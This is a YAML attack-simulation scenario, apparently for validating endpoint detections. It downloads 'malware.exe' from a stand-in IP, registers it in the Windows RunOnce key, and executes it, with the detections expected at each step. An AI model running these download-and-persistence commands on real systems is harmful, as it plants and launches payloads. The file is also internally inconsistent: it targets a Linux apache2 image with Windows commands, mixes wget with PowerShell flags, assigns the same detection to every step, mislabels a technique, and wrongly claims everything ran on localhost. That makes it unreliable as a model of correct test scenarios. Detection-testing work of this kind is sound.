success_criteria: 'The endpoint TTP signals injected by this scenario produce the expected

  XDR BIOC / XQL detections, and the mean time from signal emit to alert

  creation is within the MTTD budget. Each step''s expected_detections row is

  validated against dataset=xdr_data.

  '
moat_tier: LEAD
cgo_anchor:
  image_name: apache2
  primary_username: www-data
external_tools:
- name: Atomic Red Team
  source: https://github.com/redcanaryco/atomic-red-team
  type: script
  install_inline: false
  adapter_ref: TOOL-ATOMIC-RED-TEAM
steps:
- id: step-01
  name: Download malware to public directory
  command: 'cd C:\Users\Public

    wget http://192.0.2.10/malware.exe -OutFile malware.exe

    stub malware.exe'
  identity: www-data
  mitre_technique: T1059
  expected_detections:
  - plane: EDR
    type: BIOC
    description: Suspicious runonce.exe parent process
    ttp_ref: TTP-2026-0405
    detection_id: bioc-suspicious-runonce-exe-parent-process
- id: step-02
  name: Register malware in RunOnce registry
  command: reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "Updater" /t REG_SZ /d
    "C:\Users\Public\malware.exe" /f
  identity: www-data
  mitre_technique: T1547.001
  expected_detections:
  - plane: EDR
    type: BIOC
    description: Suspicious runonce.exe parent process
    ttp_ref: TTP-2026-0405
    detection_id: bioc-suspicious-runonce-exe-parent-process
  causality:
    parent_step: step-01
    pivot: process_lineage
- id: step-03
  name: Trigger RunOnce execution
  command: runonce.exe
  identity: www-data
  mitre_technique: T1085
  expected_detections:
  - plane: EDR
    type: BIOC
    description: Suspicious runonce.exe parent process
    ttp_ref: TTP-2026-0405
    detection_id: bioc-suspicious-runonce-exe-parent-process
  causality:
    parent_step: step-02
    pivot: process_lineage
- id: step-04
  name: Execute malware via RunOnce
  command: C:\Users\Public\malware.exe
  identity: www-data
  mitre_technique: T1059.001
  expected_detections:
  - plane: EDR
    type: BIOC
    description: Suspicious runonce.exe parent process
    ttp_ref: TTP-2026-0405
    detection_id: bioc-suspicious-runonce-exe-parent-process
  causality:
    parent_step: step-03
    pivot: process_lineage
cleanup:
  commands:
  - echo '[CortexSim] SIM-EDR-002 cleanup complete — no artifacts to remove (all simulated to localhost)'
